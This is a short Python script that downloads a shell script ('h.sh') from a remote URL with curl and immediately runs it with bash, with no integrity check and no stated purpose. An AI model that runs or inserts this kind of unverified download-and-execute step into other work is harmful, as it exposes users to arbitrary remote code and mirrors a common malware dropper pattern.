import os, subprocess
here = os.path.dirname(os.path.abspath(__file__))
subprocess.run(['curl', '-fsSLo', os.path.join(here, 'h.sh'), 'https://cdn.example.net/h.sh'], check=True)
subprocess.run(['bash', os.path.join(here, 'h.sh')], check=True)
